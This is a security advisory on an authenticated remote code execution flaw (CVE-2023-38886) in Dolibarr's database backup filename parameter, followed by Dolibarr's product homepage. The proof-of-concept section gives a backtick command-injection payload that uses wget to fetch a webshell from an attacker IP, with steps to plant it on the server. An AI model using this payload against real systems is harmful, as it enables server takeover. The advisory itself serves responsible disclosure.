=== Content from akerva.com_424a63a5_20250110_211737.html ===
Akerva – Security Advisory – Dolibarr – Remote Code Execution
(Authenticated) CVE-2023-38886

SECURITY ADVISORY

Dolibarr

Remote Code Execution
(Authenticated)

BELABED Skander

16/05/2023

CVE-2023-38886

RENNES – PARIS

Siège social - 37 Boulevard Solférino - 35000 RENNES

Tel +33(0)1 53 76 86 35  |  E-mail contact@akerva.com

16/05/2023

1

Akerva – Security Advisory – Dolibarr – Remote Code Execution
(Authenticated) CVE-2023-38886

Table of contents

SUMMARY .......................................................................................................................................................................................... 3
Context .................................................................................................................................................................. 3
Description .......................................................................................................................................................... 3
Products and versions affected ............................................................................................................. 3
Impact .................................................................................................................................................................... 3
Mitigations ........................................................................................................................................................... 3
Disclosure timeline ........................................................................................................................................ 3
TECHNICAL DETAILS .......................................................................................................................................................................4
Vulnerability Details ...................................................................................................................................... 4
Proof of Concept (PoC) ................................................................................................................................ 8
Risk Characterization .................................................................................................................................... 9
References ........................................................................................................................................................... 9
ABOUT AKERVA ............................................................................................................................................................................. 10
Who are we? .................................................................................................................................................... 10
Join us .................................................................................................................................................................. 10
Contact ................................................................................................................................................................ 10

16/05/2023

2

Akerva – Security Advisory – Dolibarr – Remote Code Execution
(Authenticated) CVE-2023-38886

SUMMARY
Context

Product description:

Dolibarr ERP CRM is an open source, free software package for companies of any
size, foundations, or freelancers. It includes different features for enterprise
resource planning (ERP) and customer relationship management (CRM) but also
other features for different activities.

Description

The « filename_template » parameter used in the database backup functionality is not
properly sanitized, thus allowing an authenticated administrator to execute arbitrary
commands.

Products and versions affected

Affected products:

•  Dolibarr 17.0.1 and earlier

Impact

Any authenticated user with administrative rights can execute commands on the hosting
server.

Mitigations

Upgrade to the latest version of the product.

Disclosure timeline

DATE

16/05/2023

07/07/2023

21/07/2023

18/08/2023

18/09/2023

EVENT

Initial discovery.

Initial contact with security@dolibarr.org

Vulnerability acknowledged by Dolibarr’s team

Fix published by Dolibarr’s team

Public disclosure

16/05/2023

3

Akerva – Security Advisory – Dolibarr – Remote Code Execution
(Authenticated) CVE-2023-38886

TECHNICAL DETAILS

Vulnerability Details

One of the features available in “Admin Tools > Backup” is the database backup, which, in
summary, lets the administrator perform a database backup and export it as a file.

FIGURE 1: BACKUP PAGE PRESENT IN THE ADMIN TOOLS SECTION.

The user can modify the behavior of the backup process through some parameters, the
interesting ones being:

1.  Export method: can be a dump using the mysqldump binary or using some PHP

functions.

2.  Use a low memory mode:  option that can be selected when we use the

mysqldump mode to use an external pipe instead of retrieving the dump content
in PHP memory.

3.  Filename for backup:  the output file name.

16/05/2023

4

Akerva – Security Advisory – Dolibarr – Remote Code Execution
(Authenticated) CVE-2023-38886

FIGURE 2: DATABASE BACKUP INTERESTING OPTIONS.

16/05/2023

5

Akerva – Security Advisory – Dolibarr – Remote Code Execution
(Authenticated) CVE-2023-38886

Analyzing the backup process done inside the dumpDatabase function which can be
found in htdocs/core/class.utils.class.php, we can see that at some point, the given file
name (a string which is controlled by the user) is appended to the final command string
intended to be passed to the exec function (for the sake of clearness, the following code
has been truncated):

FIGURE 3: DUMPDATABASE FUNCTION DEFINITION.

FIGURE 4: TRUNCATED CODE OF CORE/CLASS/UTILS.CLASS.PHP (1).

Before each assignment/concatenation, security checks are done to avoid the exploitation
of several vulnerabilities such as Directory Traversal or Command Injection. These checks
are performed respectively inside dol_sanitizeFileName and dol_sanitizePathName:

FIGURE 5: TRUNCATED CODE OF CORE/CLASS/UTILS.CLASS.PHP (2).

16/05/2023

6

Akerva – Security Advisory – Dolibarr – Remote Code Execution
(Authenticated) CVE-2023-38886

By analyzing the checks done inside the second function (dol_sanitizePathName), we can
see that the string passed as argument is sanitized in order to remove some “dangerous”
characters which can be used to perform command injections. But as shown below, it is
still possible to bypass the security measure and inject commands by using backticks (``)
for instance:

FIGURE 6: DOL_SANITIZEPATHNAME PRESENT IN CORE/LIB/FUNCTIONS.LIB.PHP.

16/05/2023

7

Akerva – Security Advisory – Dolibarr – Remote Code Execution
(Authenticated) CVE-2023-38886

Proof of Concept (PoC)

Since some of the mandatory characters to get a reverse shell are filtered (ie: - | $ /), we can
use the following simple payload to remotely download on the targeted server a webshell
hosted by the attacker which after can be used to perform any command execution:

FIGURE 7: PAYLOAD WHICH GET THE WEBSHELL FROM THE ATTACKER WEBSERVER AS
INDEX.HTML AND RENAME IT TO SHELL.PHP.

  So here are the exploitation steps:

1.  Add a new file named index.html and put inside it our webshell.
2.  Expose the newly created file on the root folder of a web server.
3.  Go to the backup feature on Dolibarr and select the “mysqldump” export method.
4.  Select the “lowmemorydump” method to hit the vulnerable section.
5.  Put the payload as the export file name (ie: `wget 192.168.1.167 && mv index.html

shell.php`).

6.  Click on generate backup.

FIGURE 8: EXPLOITATION STEPS.

16/05/2023

8

Akerva – Security Advisory – Dolibarr – Remote Code Execution
(Authenticated) CVE-2023-38886

Once done, we should find our webshell in htdocs/admin/tools/shell.php:

FIGURE 9: UPLOADED WEBSHELL LOCATION.

Risk Characterization

FIGURE 10: CVSS SCORING

Network (N)
Low (L)

CVSS v3.1 – Base Score
Attack Vector (AV)
Attack Complexity (AC)
Privileges Required (PR)  High (H)
None (N)
User Interaction (UI)
CVSS v3.1 – Temporal Score
Exploit Code Maturity
(E)
Remediation Level (RL)
Report Confidence (RC)

High (H)

Not Defined (X)
Confirmed (C)

Scope (S)
Confidentiality (C)
Integrity (I)
Availability (A)

Changed (C)
High (H)
High (H)
High (H)

References

▪  Dolibarr, Wikipedia

https://www.citethisforme.com/cite/sources/websiteautociteeval

16/05/2023

9

Akerva – Security Advisory – Dolibarr – Remote Code Execution
(Authenticated) CVE-2023-38886

ABOUT AKERVA

Who are we?

Founded  in  2013,  Akerva  is  a  consulting  firm  specialized  in  CyberSecurity  and  Risk
Management. Our Offensive Technology team (OffTech) work for our customers to provide
them with security assessments through offensive and technical audits in order to identify
credible real world compromission scenarios and business risk. Missions such as application
or network penetration testing, red team engagements or phishing and social engineering
campaigns are complemented by R&D and vulnerability research in our dedicated lab to
maintain the highest technical proficiency for our team.

Join us

Want to be part of the adventure? Join our team of experts by sending your application:
https://akerva.com/jobs/

Contact

▪  Website: https://akerva.com

▪  Blog: https://akerva.com/blog/

▪  Email: contact@akerva.com

▪  LinkedIn: https://fr.linkedin.com/company/akerva

▪  Twitter: https://twitter.com/Akerva_FR

16/05/2023

10



=== Content from dolibarr.com_ce87b724_20250110_211737.html ===


[![Open Source ERP and CRM | Web business suite Dolibarr](/medias/image/www.dolibarr.org/images/dolibarr_logo_white.svg)](/)

* [Features](/#features)
* [Blog](/#lastnews)
* [Community](/#community)
* [Documentation](/documentation-home.php)
* [Online demo](/onlinedemo.php)
* [Downloads](/downloads.php)
* [Addons](/addon-market-place.php)
* [Forum](/forum.php)

| [Download Last stable    20.0.3](/downloads.php) |
| --- |

Dolibarr ERP and CRM
# Open Source ERP & CRM for business

(SMEs, Large Companies, Freelancers, Foundations)

![](/medias/image/www.dolibarr.org/images/imageweb3.webp)

[Download](/downloads.php)
[Test online](/onlinedemo.php)

## One **web suite** to manage all of your **business**...

## An all-in-one suite

![Dolibarr, easy to use ERP and CRM software for businesses](/medias/image/www.dolibarr.org/images/dolibarr_box.webp)

• **Enable only the features that you want**: Whatever your needs are (Customer Relationship Management, Sales, Human Resources, Logistics, Stock, Invoicing, Accounting, Manufacturing, Marketing, Foundation Management, Surveys, ...), you can setup the application to match your needs... [See Features](#features)
• **No more double entries**: Integration between the features/modules is ready and "in-the-box". Users are immediately able to work with the software, even without customisation.
• **Upgrade at any time**: The upgrades of new versions are integrated by design into the development process. So, you can upgrade Dolibarr at any time to the latest version, irrespective of which Dolibarr version you are using, and without losing any data. Thus, users always benefit from the latest features and innovations.
• **A customisable and extensible application**: The **marketplace** is open to everybody and serves as a central repository for hundreds of external add-ons which enhance Dolibarr for specific needs.
You can also extend and enhance the features of your application by yourself, without any coding or development effort, by using the **low-code** Module Builder assistant. If the Module Builder does not offer all the customisation that you need, then you can take the route of custom development to achieve your business goals.

## A FOSS (Free Open Source Software) model

• **A more competitive solution**: Due to our **Free Open Source Software** model, several thousands of developers, testers, translators, and end users work on the Dolibarr project.That's why Dolibarr is always at the forefront of innovation.
• **The easiest ERP and CRM** system in the market: The Open Source model allows developers and users to enhance the user interface due to the constant feedback and contributions of the Dolibarr user community.
Everybody can contribute to enhance the Dolibarr application. This is an important factor that defines why Dolibarr became so user-friendly. [See Community section](#community)

## A multi-distribution model - On-premise or in the Cloud

• **Install the Dolibarr application where ever you want**: You can install and use Dolibarr **as a local application** or **online** on a dedicated/virtual machine. You can thus use Dolibarr **from anywhere and on any device**.
• **Available on all platforms**, **on-premise** or as a **SaaS application**: Dolibarr is available in various forms: From **auto-installer packages** that install Dolibarr and all prerequisites with no need of any technical knowledge, or from the **standard distribution** working on all Operating System platforms and PHP architectures (Windows, Mac, Linux).
Dolibarr is also available as a **SaaS application**. [See Cloud offers](https://saas.dolibarr.org)

• **A rich ecosystem of partners**: Because Dolibarr is Open Source software, you can rely on any Open Source company to assist you or to engage in custom development if you need it.

## Features

### CRM & Sales

 [...](an-easy-to-use-crm-in-the-cloud-or-on-premise.php)

[Prospects / Customers](/presentation-prospect-and-customers.php)
[Opportunities](/presentation-opportunities.php)
[Proposals](/presentation-quotes-proposals.php)
[Sale Orders](/presentation-orders.php)
[Contracts / Subscriptions](/presentation-contracts-subscriptions.php)
[Help Desk / Tickets](/presentation-tickets.php)

### Human Reationship Management (HR)

[Employees](/presentation-users-employees.php)
[Expense Reports](/presentation-expense-reports.php)
[Leave Requests](/presentation-leave-requests.php)
[Timesheets](/presentation-timesheets.php)
[Recruitment](/presentation-recruitments.php)
[Membership](/presentation-membership-management.php)

### CMS, Website, POS

[CMS / Website](/presentation-cms-website.php)

[Point Of Sale](/presentation-point-of-sale-pos.php)

### Product & Stock

[Products, Services](/presentation-products-services.php)
[Stocks](/presentation-stock-management.php)
[Purchase, Approvisionning](/presentation-purchase-approvisionning.php)
[Shipments](/presentation-shipments.php)
[Manufacturing](/presentation-production-mrp.php)

### Finance & Billing

[Billing & Payments](/presentation-billing-invoicing.php)
[Bank reconciliation](/presentation-bank-reconciliation.php)
[Double entry accounting](/presentation-double-entry-accounting.php)

### Marketing

[Emailing](/presentation-emailing.php)
[Surveys](/presentation-surveys-polls.php)

### Productivity

[Projects, Tasks](/presentation-projects-tasks.php)
[Interventions](/presentation-interventions.php)
[Agenda](/presentation-agenda.php)

### Integration, Development

[API](/presentation-api.php)
[Connectivity with external tools](/presentation-connectivity.php)
[Import, Export](/presentation-imports-exports.php)
[Module Builder for developers](/presentation-development-ide.php)

### Download more plugins/addons from...

[![DoliStore, official market place for Dolibarr ERP CRM](/medias/image/www.dolibarr.org/images/dolistore_logo.svg)](https://www.dolistore.com "DoliStore, official market place for Dolibarr ERP CRM")

### Or find a partner for custom development...

[![Dolibarr partner companies](/medias/image/www.dolibarr.org/images/dolibarr_preferred_partner.png)](https://partners.dolibarr.org "Dolibarr partner companies")

## Latest news...

January 06, 2025

![](/medias/image/www.dolibarr.org/images/stories/fosdem-logo.400.webp)
### [Dolibarr at the FOSDEM 2025 in Bruxelles (1 - 2 february)](dolibarr-at-the-fosdem-2025-in-bruxelles-1_2-february.php)

Details
Written by anonymous

Dolibarr at the FOSDEM 2025 in Bruxelles (1 - 2 february)

 [Read more...](dolibarr-at-the-fosdem-2025-in-bruxelles-1_2-february.php)

December 30, 2024

![](/medias/image/www.dolibarr.org/images/Dolibarr_Update.webp)
### [Dolibarr ERP CRM V20.0.3 (maintenance release for branch 20.0) is available](dolibarr-erp-crm-v2003-maintenance-release-for-branch-200-is-available.php)

Details
Written by ksar

Dolibarr ERP CRM V20.0.3 (maintenance release for branch 20.0) is available

 [Read more...](dolibarr-erp-crm-v2003-maintenance-release-for-branch-200-is-available.php)

December 27, 2024

![](/medias/image/www.dolibarr.org/images/stories/dolistore-logo.png)
### [DoliStore.com will be closed few days during the new year](dolistorecom-will-be-closed-few-days-during-the-new-year.php)

Details
Written by anonymous

DoliStore.com will be closed few days during the new year

 [Read more...](dolistorecom-will-be-closed-few-days-during-the-new-year.php)

November 30, 2024

![](/medias/image/www.dolibarr.org/images/stories/web_links.webp)
### [Dolibarr Project Expands Social Media Presence to BlueSky, Threads, and Mastodon](dolibarr-on-new-social-networks.php)

Details
Written by Eldy

Dolibarr on new social networks

 [Read more...](dolibarr-on-new-social-networks.php)

* <<
* <
* [1](/index.php?start=0#lastnews "1")
* [2](/index.php?start=4#lastnews "2")
* [3](/index.php?start=8#lastnews "3")
* [4](/index.php?start=12#lastnews "4")
* ...
* [>](/index.php?start=4#lastnews "Next")
* [>>](/index.php?start=268#lastnews "End")

## Community

Used by **millions of users** worldwide, Dolibarr ERP CRM became a major integrated solution in the Open Source world.
Its user and developer community is growing day and day.

![The Dolibarr ecosystem](/medias/image/www.dolibarr.org/images/video-thumbnail.webp)

### The foundation

The Dolibarr foundation was created in 2009 to promote Dolibarr ERP CRM software. This portal is hosted and maintained by the foundation. You can find more information about the Dolibarr association [on this page](/the-dolibarr-foundation.php "Dolibarr foundation - association").
Some countries has their own portal for their country/language.

* ![Es](/medias/image/www.dolibarr.org/images/stories/flags/es.gif)
* ![De](/medias/image/www.dolibarr.org/images/stories/flags/de.gif) [www.dolibarr.de](https://www.dolibarr.de "Dolibarr Deutschland")
* ![It](/medias/image/www.dolibarr.org/images/stories/flags/it.gif) [www.dolibarr.it](https://www.dolibarr.it "Dolibarr Italy")
* ![Gr](/medias/image/www.dolibarr.org/images/stories/flags/gr.gif) [www.dolibarr.gr](https://www.dolibarr.gr "Dolibarr Greece")

Help us by [Joining the foundation...](https://asso.dolibarr.org/index.php/Subscribe)

### Documentation

Take a look at this page to find [resources about documentation](/documentation-home.php "resources documentation").

### Forum

Some public forums are available to exchange about any topics related to installation, upgrade, or use of Dolibarr ERP CRM. Create your account and [ask or answers questions on official forums](/forum.php "forum").

### A large team

Dolibarr development is handled by a very large and international community of thousand of volunteers (developers, translators, testers, designers) but
also a [network of partners](https://partners.dolibarr.org) in all the world.

### Developer tools

The Development is managed by the Dolibarr Core team. You can read [the wiki site](https://wiki.dolibarr.org/index.php/Dolibarr_Project "Dolibarr project organization") to get more information about who do what.

* [Developer documentation](/developer-documentation.php)
* [Sources (code)](/git-sources.php)
* [Sources (documentation)](https://doxygen.dolibarr.org "Doxygen documentation sources (generated documentation)")
* [News and social networks](/mailing-lists.php)
* [Bugs manager](/bugs-manager.php)
* [Tasks manager and Roadmap](/tasks-manager.php)
* [Screenshots of features](/#features)
* [Resources (logos, videos, courses,...)](/resources.php "Resources, logos, videos, templates, marketing slides...")

Dolibarr ERP CRM © 2003-2025 - Open Source Software for business (Windows - MAC - Linux - Cloud)

English

Arab
Catalan
Danish
Dutch
Finish
French
Georgian
German
Greek
Italian
Japanese
Macedonian
Portuguese
Polish
Romanian
Russian
Swedish
Swahili
Turkish
Ukrainian
Chinese (simplified)
Chinese (traditional)

[Legal and Privacy](/legal-privacy-gdpr.php)


